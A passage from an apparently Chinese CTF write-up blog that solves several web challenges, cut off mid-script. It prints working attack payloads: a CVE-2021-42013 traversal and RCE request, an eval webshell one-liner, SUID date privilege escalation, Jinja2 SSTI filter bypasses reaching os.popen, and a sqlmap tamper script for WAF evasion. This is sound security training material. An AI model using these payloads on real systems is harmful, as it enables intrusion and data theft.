<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tar+-czvf+/var/www/html/upload/html.tar.gz+/var/www/html&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>打包题目源码，直接访问 <code>/upload/html.tar.gz</code> 即可下载。</p>
<p>“index.php”：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=<span class="string">&quot;center&quot;</span>&gt;大家好，这是一个不会写前端的web手做的图片渲染器，上传图片，我会帮你渲染出来的&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$extension</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="variable">$extension</span> = <span class="string">&quot;.&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$extension</span>));</span><br><span class="line">            <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>, <span class="string">&quot;.php5&quot;</span>, <span class="string">&quot;.php4&quot;</span>, <span class="string">&quot;.php3&quot;</span>, <span class="string">&quot;.php2&quot;</span>, <span class="string">&quot;.php1&quot;</span>, <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.htm&quot;</span>, <span class="string">&quot;.phtml&quot;</span>, <span class="string">&quot;.pht&quot;</span>, <span class="string">&quot;.pHp&quot;</span>, <span class="string">&quot;.pHp5&quot;</span>, <span class="string">&quot;.pHp4&quot;</span>, <span class="string">&quot;.pHp3&quot;</span>, <span class="string">&quot;.pHp2&quot;</span>, <span class="string">&quot;.pHp1&quot;</span>, <span class="string">&quot;.Html&quot;</span>, <span class="string">&quot;.Htm&quot;</span>, <span class="string">&quot;.pHtml&quot;</span>, <span class="string">&quot;.jsp&quot;</span>, <span class="string">&quot;.jspa&quot;</span>, <span class="string">&quot;.jspx&quot;</span>, <span class="string">&quot;.jsw&quot;</span>, <span class="string">&quot;.jsv&quot;</span>, <span class="string">&quot;.jspf&quot;</span>, <span class="string">&quot;.jtml&quot;</span>, <span class="string">&quot;.jSp&quot;</span>, <span class="string">&quot;.jSpx&quot;</span>, <span class="string">&quot;.jSpa&quot;</span>, <span class="string">&quot;.jSw&quot;</span>, <span class="string">&quot;.jSv&quot;</span>, <span class="string">&quot;.jSpf&quot;</span>, <span class="string">&quot;.jHtml&quot;</span>, <span class="string">&quot;.asp&quot;</span>, <span class="string">&quot;.aspx&quot;</span>, <span class="string">&quot;.asa&quot;</span>, <span class="string">&quot;.asax&quot;</span>, <span class="string">&quot;.ascx&quot;</span>, <span class="string">&quot;.ashx&quot;</span>, <span class="string">&quot;.asmx&quot;</span>, <span class="string">&quot;.cer&quot;</span>, <span class="string">&quot;.aSp&quot;</span>, <span class="string">&quot;.aSpx&quot;</span>, <span class="string">&quot;.aSa&quot;</span>, <span class="string">&quot;.aSax&quot;</span>, <span class="string">&quot;.aScx&quot;</span>, <span class="string">&quot;.aShx&quot;</span>, <span class="string">&quot;.aSmx&quot;</span>, <span class="string">&quot;.cEr&quot;</span>, <span class="string">&quot;.sWf&quot;</span>, <span class="string">&quot;.swf&quot;</span>, <span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;上传木马可不是好习惯～～～&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;upload/&quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]) . <span class="string">&quot;&#x27;&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;form align=<span class="string">&quot;center&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>还可以利用『Apache多后缀解析漏洞（apache_parsing_vulnerability）』解决。</p>
<blockquote>
<p>apache httpd 支持一个文件多个后缀，windows 对于多后缀的识别是看最后一个”.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别</p>
</blockquote>
<p>因此上传文件时，将后缀名改为无意义的后缀，即可被 apache 服务器忽略并解析前面的内容，例如”.php.123”会被解析为 php 文件。</p>
<h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><p><em>起初看到 BUU 给了一个不太一样的 URL，结合题目名称以为是个渗透环境，扫了一下端口才意识到主机就是 BUU 源站，那就是扫目录了吧！结果也不是。</em></p>
<p>使用的是一个 CVE：<a class="link"   target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-42013/README.zh-cn.md" >VulHub.CVE-2021-42013 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>访问题目给出的 URL 后跳出的”It works!”正是 vulhub 提供的该 CVE 复现环境的标志。该漏洞出现在”Apache HTTP Server-2.4.50”中，首先是一个目录穿越漏洞，PoC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/icons/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/.%%<span class="number">32</span>%<span class="number">65</span>/etc/passwd</span><br></pre></td></tr></table></figure></div>

<p>访问该路径即可实现目录穿越，读取到”&#x2F;etc&#x2F;passwd”文件；其中的 <code>icons</code> 必须为一个存在且可访问的目录。</p>
<p>如果目标服务开启了”cgi”或”cgid”模块，那么可以由目录穿越拓展到远程代码执行，PoC：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:29066</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;2d-432a5e4a73a80&quot;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">echo</span>;<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure></div>

<p>用 Get 方式与目录穿越访问 sh，在请求体中带上：<code>echo;&lt;cmd&gt;</code> 即可执行 <code>&lt;cmd&gt;</code> shell 命令。</p>
<p>本题服务并不是起在常见的”&#x2F;var&#x2F;www&#x2F;html”下，因此单纯的目录穿越得不到 flag，利用任意命令执行发现根目录下有改名后的 flag 文件，读取即可。</p>
<p><strong>Tips：</strong></p>
<ol>
<li><p>使用浏览器测试 PoC 会失效，因为 PoC 使用了双重 URL 编码（<code>%%32%65</code> 其实就是 <code>%2e</code>），浏览器会自动为其解码一层，但只有一层时不会解码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">2</span>e</span><br><span class="line">=&gt; %<span class="number">2</span>e</span><br><span class="line">%%<span class="number">32</span>%<span class="number">65</span></span><br><span class="line">=&gt; %<span class="number">252</span>e</span><br><span class="line">%%%<span class="number">33</span>%<span class="number">32</span></span><br><span class="line">=&gt; %%<span class="number">2532</span></span><br></pre></td></tr></table></figure></div>

<p><code>%25</code> 即 <code>%</code> 。被解码内容前的第一个多余百分号会被 URL 编码，其他百分号会被保留。</p>
<hr>
<p>因此建议使用 <code>curl</code> 或 burp 来发送 payload。</p>
</li>
<li><p>“&#x2F;icons”目录用 dirmap 扫不出来，但他在环境中确实存在。这好像不是一个常规文件夹。使用”&#x2F;icons”路由会做文件访问，出现”Not Found”提示；使用”&#x2F;icons&#x2F;“进行正确的文件夹访问，获取到文件夹下的内容。</p>
</li>
<li><p>经测试，PoC 中的『可访问文件夹』必须是真正可访问的（包括权限问题），只是存在的文件夹并不能满足要求。</p>
</li>
</ol>
<h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><p><em>要用到提权的 RCE！太高级辣！</em></p>
<p>题目源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|curl/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>shell_exec()</code> 函数会执行传入的 shell 命令，并返回命令的有效结果，但由于没有 <code>echo</code> ，我们得不到命令的输出。</p>
<p>看起来他不想让我们反弹 shell，尝试用 <code>bas\h</code> 绕过过滤来反弹 shell，发现不行，用 <code>curl</code> 访问 dnslog 发现没反应，目标应该不出网。</p>
<p>目标的 web 服务搭建在常规目录”&#x2F;var&#x2F;www&#x2F;html&#x2F;“下，手动创建一个 php 木马：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span>+<span class="string">&quot;&lt;?php+@eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>+&gt;+/var/www/html/pet.php</span><br></pre></td></tr></table></figure></div>

<p>访问木马执行命令，发现根目录下有 flag，但读取不到（无任何反应），可能是空的也可能是权限不足，<code>ls+-al+/</code> 查看权限，发现 flag 无读取权限。</p>
<p>利用 SUID 提权，查找有 SUID 权限的文件&#x2F;命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find+/+-perm+-4000+-<span class="built_in">type</span>+f</span><br><span class="line"><span class="comment"># -4000 表示查询特殊权限位为 s、其他权限位任意的目标，可以换成 -u=s;</span></span><br><span class="line">=&gt; /bin/date /bin/mount /bin/su /bin/umount</span><br></pre></td></tr></table></figure></div>

<p>发现 <code>date</code> 命令有 SUID 权限，<code>date -f &lt;file&gt;</code> 可以读取文件内容，本地测试一下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cool&quot;</span> &gt; a.txt</span><br><span class="line"><span class="built_in">date</span> -f a.txt</span><br><span class="line">=&gt; <span class="built_in">date</span>: invalid <span class="built_in">date</span> ‘cool’</span><br></pre></td></tr></table></figure></div>

<p>在报错中回显了目标文件的内容，但 php 的 <code>system</code> 命令并不回显标准错误输出 stderr，因此将其重定向至文件中再读取。Linux 的根目录下”tmp&#x2F;“目录有 777 的权限，可以在其中创建文件也可以读取文件。得到 payload：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span>+-f+/f*+2&gt;/tmp/flag.txt</span><br><span class="line"><span class="built_in">cat</span>+/tmp/flag.txt</span><br><span class="line">=&gt; <span class="built_in">date</span>: invalid <span class="built_in">date</span> <span class="string">&#x27;flag&#123;47e559f1-38b3-47d3-bbf1-db16cad79766&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>成功读取 flag。</p>
<h3 id="BabySSTI-Three"><a href="#BabySSTI-Three" class="headerlink" title="BabySSTI_Three"></a>BabySSTI_Three</h3><p><em>第一道不是完全照着题解做出来的 SSTI！</em></p>
<p>哎，SSTI；哎，Python；哎，魔术函数；哎，沙箱逃逸；哎，waf 过滤。SSTI 就突出一个抽象！</p>
<p>题目在 Two 的基础上增加了对”_“的过滤，用 16 进制转义绕过，先读取到 object：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>一个偶然发现的没什么卵用的小知识，用 burp 调试题目时发现，返回的内容 <code>&lt;class &#39;object&#39;&gt;</code> 其实是在前端的，只是被当成标签解析了所以看不见。</p>
<p>另一个没什么卵用的还不知道对不对的发现是，<code>&#39;&#39;[&#39;sth&#39;]</code> 这种读取对象<strong>属性</strong>的替代方式只在 jinja2 的模板语法中有效，在原生的 python shell 中是会报错的</p>
</blockquote>
<p>接着获取其可用的子类，获取子类环境中可用的函数，用 burp 爆破出一个可用一些特殊函数的子类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubc&#x27;&#x27;lasses\x5f\x5f&#x27;]()[202][&#x27;\x5f\x5fin&#x27;&#x27;it\x5f\x5f&#x27;][&#x27;\x5f\x5fglob&#x27;&#x27;als\x5f\x5f&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>要注意 <code>__subclasses__()</code> 是一个函数需要调用！有好多子类是没有任何可调用内容的，随便选了一个 202 就发现里面的 <code>__builtins__.__import__</code> 函数可用。</p>
<blockquote>
<p>这里的标准做法是用 burp 爆破所有子类，寻找其中可用的敏感函数。但是 <code>__globals__</code> 内容有些抽象，暂时不能完整准确的理解，只能提取关键词大致猜测哪些是可用的函数。</p>
</blockquote>
<p>接着利用找到的函数 RCE 即可：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;\x5f\x5fcla&#x27;&#x27;ss\x5f\x5f&#x27;][&#x27;\x5f\x5fmr&#x27;&#x27;o\x5f\x5f&#x27;][-1][&#x27;\x5f\x5fsubc&#x27;&#x27;lasses\x5f\x5f&#x27;]()[202][&#x27;\x5f\x5fin&#x27;&#x27;it\x5f\x5f&#x27;][&#x27;\x5f\x5fglob&#x27;&#x27;als\x5f\x5f&#x27;][&#x27;\x5f\x5fbuil&#x27;&#x27;tins\x5f\x5f&#x27;][&#x27;\x5f\x5fimp&#x27;&#x27;ort\x5f\x5f&#x27;](&#x27;o&#x27;&#x27;s&#x27;)[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ca&#x27;&#x27;t$&#123;IFS&#125;/f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>替换过滤字符，空格用 <code>$&#123;IFS&#125;</code> ，”flag”用”f*”。</p>
<p><strong>Tips：</strong></p>
<ol>
<li>不知道是 jinja2 模板语法的问题还是题目环境的问题，一些很常见的函数无法使用，例如 <code>len(), chr()</code> </li>
<li><code>requests</code> 惨遭过滤，本来可以考虑用 <code>requests.args.key&amp;key=__class__</code> 来绕过过滤的。</li>
</ol>
<h3 id="Final-Round"><a href="#Final-Round" class="headerlink" title="Final Round"></a>Final Round</h3><p>一道让我更了解 Sqlmap 的题目。</p>
<p>输入留言编号”name”来查询留言，发送请求后只会回显同一种页面，抹杀了布尔盲注的可能。关闭了新建留言的功能，断绝了 Insert 注入的可能。</p>
<p>手动测试了一下，name 为数字型，ban 了一些特殊字符如空格、水平制表符 Tab <code>%09 </code>、换行 <code>%0A</code> 、回车 <code>%0D</code> 以及 <code>*</code> 。空白字符用 <code>%0B</code> 或 <code>%0C</code> 代替，测试出可以时间盲注，PoC：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span>%<span class="number">0</span>Band%<span class="number">0</span>Bsleep(<span class="number">1</span>)%<span class="number">0</span>Band%<span class="number">0B1</span></span><br></pre></td></tr></table></figure></div>

<p>考虑直接使用 sqlmap 梭哈，由于需要替换空白字符，需要手动编写一个 tamper 脚本，考虑从 sqlmap 自带的脚本中修改，先放上最终版脚本”space2blank.py”：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces (MySQL) instances of space character (&#x27; &#x27;) with a random blank character from a valid set of alternate characters</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 5.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass several web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; random.seed(0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT%A0id%0CFROM%0Dusers&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ASCII table:</span></span><br><span class="line">    <span class="comment">#   TAB     09      horizontal TAB</span></span><br><span class="line">    <span class="comment">#   LF      0A      new line</span></span><br><span class="line">    <span class="comment">#   FF      0C      new page</span></span><br><span class="line">    <span class="comment">#   CR      0D      carriage return</span></span><br><span class="line">    <span class="comment">#   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span></span><br><span class="line">    <span class="comment">#           A0      non-breaking space</span></span><br><span class="line">    blanks = (</span><br><span class="line">            <span class="comment"># &#x27;%09&#x27;, </span></span><br><span class="line">            <span class="comment"># &#x27;%0A&#x27;, </span></span><br><span class="line">            <span class="string">&#x27;%0C&#x27;</span>, </span><br><span class="line">            <span class="comment"># &#x27;%0D&#x27;, </span></span><br><span class="line">            <span class="string">&#x27;%0B&#x27;</span> </span><br><span class="line">            <span class="comment"># &#x27;%A0&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += random.choice(blanks)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += 